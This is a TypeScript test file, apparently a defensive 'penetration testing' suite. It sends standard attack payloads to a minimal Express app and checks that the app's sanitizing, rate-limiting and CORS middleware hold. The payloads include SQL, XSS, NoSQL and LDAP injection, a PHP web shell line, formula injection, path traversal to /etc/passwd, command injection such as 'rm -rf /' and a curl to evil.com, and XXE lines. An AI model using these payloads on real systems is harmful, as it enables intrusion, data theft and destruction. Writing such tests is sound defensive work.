import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import express from 'express';
import { createServer } from 'http';
import { PrismaClient } from '@prisma/client';

// Set encryption key for testing
process.env.ENCRYPTION_KEY = 'a'.repeat(64); // 32 bytes in hex

// Import the main app setup (you might need to adjust this import)
// For testing purposes, we'll create a minimal app setup
const createTestApp = async () => {
  const app = express();
  
  // Configure trust proxy properly for rate limiting tests
  app.set('trust proxy', ['127.0.0.1', '::1']);
  
  // Basic middleware setup for testing
  app.use(express.json({ limit: '10mb' })); // Reduced limit for DoS testing
  app.use(express.urlencoded({ extended: true, limit: '10mb' }));
  
  // Import security middleware
  const securityModule = await import('../middleware/security.js');
  const {
    generalRateLimit,
    corsOptions,
    sanitizeInput,
    securityHeaders
  } = securityModule;
  
  app.use(securityHeaders);
  app.use(require('cors')(corsOptions));
  app.use(sanitizeInput);
  
  // Test endpoints
  app.post('/api/test/sql', (req, res) => {
    // Simulate a vulnerable endpoint for testing
    const { query } = req.body;
    res.json({ received: query });
  });
  
  app.post('/api/test/xss', (req, res) => {
    const { content } = req.body;
    res.json({ content });
  });
  
  app.get('/api/test/rate-limit', generalRateLimit, (req, res) => {
    res.json({ success: true, timestamp: Date.now() });
  });
  
  return app;
};

describe('Penetration Testing', () => {
  let app: express.Application;
  let server: any;
  let prisma: PrismaClient;

  beforeAll(async () => {
    app = await createTestApp();
    server = createServer(app);
    prisma = new PrismaClient();
  });

  afterAll(async () => {
    if (server) {
      server.close();
    }
    if (prisma) {
      await prisma.$disconnect();
    }
  });

  describe('SQL Injection Attacks', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM passwords --",
      "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --"
    ];

    it('should block SQL injection attempts in request body', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/test/sql')
          .send({ query: payload });

        // The sanitization should have cleaned the payload
        expect(response.body.received).not.toBe(payload);
        expect(response.body.received).not.toContain('DROP TABLE');
        expect(response.body.received).not.toContain('UNION SELECT');
        expect(response.body.received).not.toContain('INSERT INTO');
      }
    });

    it('should block SQL injection in query parameters', async () => {
      const payload = "'; DROP TABLE users; --";
      const response = await request(app)
        .get(`/api/test/sql?search=${encodeURIComponent(payload)}`);

      expect(response.status).toBeLessThan(500); // Should not cause server error
    });
  });

  describe('Cross-Site Scripting (XSS) Attacks', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<div onclick="alert(\'XSS\')">Click me</div>',
      '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
      '<style>@import"javascript:alert(\'XSS\')";</style>',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//'
    ];

    it('should sanitize XSS attempts in request body', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // The content should be sanitized
        expect(response.body.content).not.toContain('<script>');
        expect(response.body.content).not.toContain('javascript:');
        expect(response.body.content).not.toContain('onerror=');
        expect(response.body.content).not.toContain('onload=');
        expect(response.body.content).not.toContain('onclick=');
      }
    });
  });

  describe('Rate Limiting Attacks', () => {
    it('should enforce rate limits', async () => {
      const requests: Promise<any>[] = [];
      const maxRequests = 150; // Exceed the general rate limit

      // Send many requests rapidly
      for (let i = 0; i < maxRequests; i++) {
        requests.push(
          request(app)
            .get('/api/test/rate-limit')
            .set('X-Forwarded-For', '192.168.1.100') // Simulate same IP
        );
      }

      const responses = await Promise.allSettled(requests);
      const rateLimitedResponses = responses.filter(
        (result): result is PromiseFulfilledResult<any> => 
          result.status === 'fulfilled' && result.value.status === 429
      );

      // Should have some rate-limited responses
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should handle distributed attacks from different IPs', async () => {
      const requests: Promise<any>[] = [];
      const ipsToTest = 10;
      const requestsPerIp = 20;

      for (let ip = 1; ip <= ipsToTest; ip++) {
        for (let req = 1; req <= requestsPerIp; req++) {
          requests.push(
            request(app)
              .get('/api/test/rate-limit')
              .set('X-Forwarded-For', `192.168.1.${ip}`)
          );
        }
      }

      const responses = await Promise.allSettled(requests);
      const successfulResponses = responses.filter(
        (result): result is PromiseFulfilledResult<any> => 
          result.status === 'fulfilled' && result.value.status === 200
      );

      // Most requests should succeed since they're from different IPs
      expect(successfulResponses.length).toBeGreaterThan(ipsToTest * 5);
    });
  });

  describe('File Upload Attacks', () => {
    const maliciousFileContents = [
      '<?php system($_GET["cmd"]); ?>',
      '<script>alert("XSS in CSV")</script>',
      'javascript:alert("XSS")',
      '=cmd|"/c calc"!A1', // Excel formula injection
      '@SUM(1+1)*cmd|"/c calc"!A1',
      '=HYPERLINK("http://evil.com","Click me")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ];

    it('should detect malicious content in uploaded files', () => {
      const maliciousPatterns = [
        /<script/i,
        /javascript:/i,
        /<iframe/i,
        /eval\(/i,
        /document\.write/i
      ];

      maliciousFileContents.forEach(content => {
        const isMalicious = maliciousPatterns.some(pattern => pattern.test(content));
        if (content.includes('<script>') || content.includes('javascript:') || content.includes('<iframe>')) {
          expect(isMalicious).toBe(true);
        }
      });
    });

    it('should validate file extensions', () => {
      const maliciousExtensions = [
        'test.php.csv',
        'data.exe',
        'script.js.csv',
        'malware.bat',
        'virus.scr'
      ];

      const allowedExtensions = ['.csv', '.xlsx', '.xls', '.json'];
      
      maliciousExtensions.forEach(filename => {
        const extension = filename.substring(filename.lastIndexOf('.'));
        const isAllowed = allowedExtensions.includes(extension.toLowerCase());
        
        if (filename.includes('.exe') || filename.includes('.bat') || filename.includes('.scr')) {
          expect(isAllowed).toBe(false);
        }
      });
    });
  });

  describe('Directory Traversal Attacks', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc//passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ];

    it('should block directory traversal attempts', () => {
      const traversalPattern = /\.\./;
      
      traversalPayloads.forEach(payload => {
        try {
          const decoded = decodeURIComponent(payload);
          const containsTraversal = traversalPattern.test(decoded) || traversalPattern.test(payload);
          
          if (payload.includes('..')) {
            expect(containsTraversal).toBe(true);
          }
        } catch (error) {
          // If decoding fails, the payload itself should contain traversal patterns
          const containsTraversal = traversalPattern.test(payload);
          expect(containsTraversal).toBe(true);
        }
      });
    });
  });

  describe('Command Injection Attacks', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& rm -rf /',
      '`whoami`',
      '$(id)',
      '; ping -c 10 127.0.0.1',
      '| nc -l -p 1234',
      '; curl http://evil.com/steal-data'
    ];

    it('should sanitize command injection attempts', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // Should not contain dangerous command characters
        expect(response.body.content).not.toContain('rm -rf');
        expect(response.body.content).not.toContain('cat /etc');
        expect(response.body.content).not.toContain('whoami');
      }
    });
  });

  describe('Header Injection Attacks', () => {
    const headerInjectionPayloads = [
      'test\r\nX-Injected-Header: malicious',
      'test\nSet-Cookie: admin=true',
      'test\r\nLocation: http://evil.com',
      'test%0d%0aX-Injected: header'
    ];

    it('should prevent header injection', async () => {
      for (const payload of headerInjectionPayloads) {
        try {
          const response = await request(app)
            .get('/api/test/rate-limit')
            .set('User-Agent', payload);

          // Should not have injected headers
          expect(response.headers['x-injected-header']).toBeUndefined();
          expect(response.headers['x-injected']).toBeUndefined();
          expect(response.status).not.toBe(302); // No redirect injection
        } catch (error) {
          // If the request fails due to invalid header, that's actually good security
          expect((error as any).code).toBe('ERR_INVALID_CHAR');
        }
      }
    });
  });

  describe('CORS Attacks', () => {
    it('should enforce CORS policy', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://malicious-site.com',
        'http://localhost:3000.evil.com',
        'null'
      ];

      for (const origin of maliciousOrigins) {
        const response = await request(app)
          .options('/api/test/rate-limit')
          .set('Origin', origin)
          .set('Access-Control-Request-Method', 'GET');

        // Should not allow malicious origins
        if (origin !== 'null') {
          expect(response.headers['access-control-allow-origin']).not.toBe(origin);
        }
      }
    });

    it('should allow legitimate origins', async () => {
      const legitimateOrigins = [
        'http://localhost:3000',
        'http://localhost:5173'
      ];

      for (const origin of legitimateOrigins) {
        const response = await request(app)
          .options('/api/test/rate-limit')
          .set('Origin', origin)
          .set('Access-Control-Request-Method', 'GET');

        // Should allow legitimate origins
        expect(response.status).not.toBe(403);
      }
    });
  });

  describe('Authentication Bypass Attempts', () => {
    const bypassPayloads = [
      { authorization: 'Bearer null' },
      { authorization: 'Bearer undefined' },
      { authorization: 'Bearer admin' },
      { authorization: 'Bearer ' + 'A'.repeat(1000) },
      { 'x-user-id': 'admin' },
      { 'x-bypass-auth': 'true' }
    ];

    it('should not allow authentication bypass', async () => {
      // Since our test endpoint doesn't require auth, we'll test that malicious headers
      // don't cause server errors or expose sensitive information
      for (const headers of bypassPayloads) {
        const response = await request(app)
          .get('/api/test/rate-limit')
          .set(headers);

        // Should handle the request without crashing (200 is OK for unprotected endpoint)
        // but should not expose any sensitive information in headers
        expect(response.status).toBeLessThan(500);
        expect(response.headers['x-user-id']).toBeUndefined();
        expect(response.headers['x-bypass-auth']).toBeUndefined();
        expect(response.headers['x-admin']).toBeUndefined();
      }
    });
  });

  describe('Denial of Service (DoS) Attacks', () => {
    it('should handle large payloads gracefully', async () => {
      const largePayload = {
        data: 'A'.repeat(15 * 1024 * 1024) // 15MB string (larger than 10MB limit)
      };

      const response = await request(app)
        .post('/api/test/xss')
        .send(largePayload);

      // Should either reject or handle gracefully, not crash
      expect([400, 413, 500]).toContain(response.status);
    }, 10000); // 10 second timeout

    it('should handle deeply nested objects', async () => {
      // Create deeply nested object
      let nestedObj: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        nestedObj = { nested: nestedObj };
      }

      const response = await request(app)
        .post('/api/test/xss')
        .send(nestedObj);

      // Should handle without crashing
      expect(response.status).toBeLessThan(600);
    });

    it('should handle many simultaneous connections', async () => {
      const simultaneousRequests = 100;
      const requests: Promise<any>[] = [];

      for (let i = 0; i < simultaneousRequests; i++) {
        requests.push(
          request(app)
            .get('/api/test/rate-limit')
            .set('X-Forwarded-For', `192.168.2.${i % 255}`)
        );
      }

      const responses = await Promise.allSettled(requests);
      const successfulResponses = responses.filter(
        (result): result is PromiseFulfilledResult<any> => result.status === 'fulfilled'
      );

      // Should handle most requests without crashing
      expect(successfulResponses.length).toBeGreaterThan(simultaneousRequests * 0.5);
    });
  });

  describe('Information Disclosure', () => {
    it('should not expose sensitive server information', async () => {
      const response = await request(app)
        .get('/api/test/rate-limit');

      // Should not expose server details
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['x-aspnet-version']).toBeUndefined();
    });

    it('should not expose stack traces in production', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      // Try to trigger an error
      const response = await request(app)
        .post('/api/test/nonexistent')
        .send({ malformed: 'data' });

      // Should not expose stack traces
      if (response.body.error) {
        expect(response.body.error).not.toContain('at ');
        expect(response.body.error).not.toContain('.js:');
        expect(response.body.stack).toBeUndefined();
      }

      process.env.NODE_ENV = originalEnv;
    });
  });

  describe('Advanced Injection Attacks', () => {
    it('should block NoSQL injection attempts', async () => {
      const nosqlPayloads = [
        '{"$where": "this.username == this.password"}',
        '{"username": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
        '{"password": {"$regex": ".*"}}',
        '{"$gt": ""}',
        '{"$lt": ""}',
        '{"$and": [{"username": "admin"}]}'
      ];

      for (const payload of nosqlPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // Should sanitize NoSQL injection patterns
        expect(response.body.content).not.toContain('$where');
        expect(response.body.content).not.toContain('$ne');
        expect(response.body.content).not.toContain('$or');
        expect(response.body.content).not.toContain('$regex');
      }
    });

    it('should block LDAP injection attempts', async () => {
      const ldapPayloads = [
        'admin*)',
        'admin)(|(password=*))',
        '*)(&(password=*))',
        'admin)(&(|(objectclass=*)))',
        '*)((|password=*))'
      ];

      for (const payload of ldapPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // Should handle LDAP injection attempts
        expect(response.status).toBeLessThan(500);
      }
    });

    it('should block advanced path traversal attempts', async () => {
      const pathTraversalPayloads = [
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..\\..\\..\\windows\\system32\\config\\sam'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/test/rate-limit?file=${encodeURIComponent(payload)}`);

        // Should handle path traversal attempts without crashing
        expect(response.status).toBeLessThan(500);
      }
    });
  });

  describe('Content Security Policy Bypass', () => {
    it('should block CSP bypass attempts', async () => {
      const cspBypassPayloads = [
        '<link rel="dns-prefetch" href="//evil.com">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<base href="javascript:alert(1)//">',
        '<form action="javascript:alert(1)"><input type="submit">',
        '<details open ontoggle="alert(1)">',
        '<marquee onstart="alert(1)">XSS</marquee>'
      ];

      for (const payload of cspBypassPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // Should sanitize CSP bypass attempts
        expect(response.body.content).not.toContain('javascript:');
        expect(response.body.content).not.toContain('ontoggle=');
        expect(response.body.content).not.toContain('onstart=');
      }
    });
  });

  describe('HTTP Parameter Pollution', () => {
    it('should handle parameter pollution attacks', async () => {
      const response = await request(app)
        .get('/api/test/rate-limit?id=1&id=2&id=3&id[]=4&id[]=5');

      // Should handle multiple parameters without crashing
      expect(response.status).toBeLessThan(500);
    });

    it('should handle array parameter pollution', async () => {
      const response = await request(app)
        .post('/api/test/xss')
        .send({
          'content': 'normal',
          'content[]': ['malicious1', 'malicious2'],
          'content[0]': 'override'
        });

      // Should handle array pollution without crashing
      expect(response.status).toBeLessThan(500);
    });
  });

  describe('Protocol Confusion Attacks', () => {
    it('should block data URI schemes', async () => {
      const dataUriPayloads = [
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:application/javascript,alert(1)',
        'data:text/vbscript,msgbox("xss")'
      ];

      for (const payload of dataUriPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // Should sanitize data URI schemes
        expect(response.body.content).not.toContain('data:text/html');
        expect(response.body.content).not.toContain('data:application/javascript');
      }
    });
  });

  describe('Server-Side Template Injection', () => {
    it('should block template injection attempts', async () => {
      const templateInjectionPayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{config.items}}',
        '${java.lang.Runtime}',
        '{{request.application}}'
      ];

      for (const payload of templateInjectionPayloads) {
        const response = await request(app)
          .post('/api/test/xss')
          .send({ content: payload });

        // Should handle template injection attempts
        expect(response.status).toBeLessThan(500);
        // The payload might be sanitized or passed through, but shouldn't cause server errors
      }
    });
  });

  describe('XML External Entity (XXE) Attacks', () => {
    it('should block XXE attempts in JSON', async () => {
      const xxePayloads = [
        '{"xml": "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY test SYSTEM \\"file:///etc/passwd\\">]><root>&test;</root>"}',
        '{"data": "<!ENTITY xxe SYSTEM \\"http://evil.com/evil.dtd\\">"}',
        '{"content": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \\"file:///etc/passwd\\" >]><foo>&xxe;</foo>"}'
      ];

      for (const payload of xxePayloads) {
        try {
          const response = await request(app)
            .post('/api/test/xss')
            .set('Content-Type', 'application/json')
            .send(payload);

          // Should handle XXE attempts without exposing system files
          expect(response.status).toBeLessThan(500);
          if (response.body.content) {
            expect(response.body.content).not.toContain('root:x:0:0');
            expect(response.body.content).not.toContain('/etc/passwd');
          }
        } catch (error) {
          // If parsing fails, that's acceptable for malformed JSON
          expect((error as any).status).toBeDefined();
        }
      }
    });
  });
});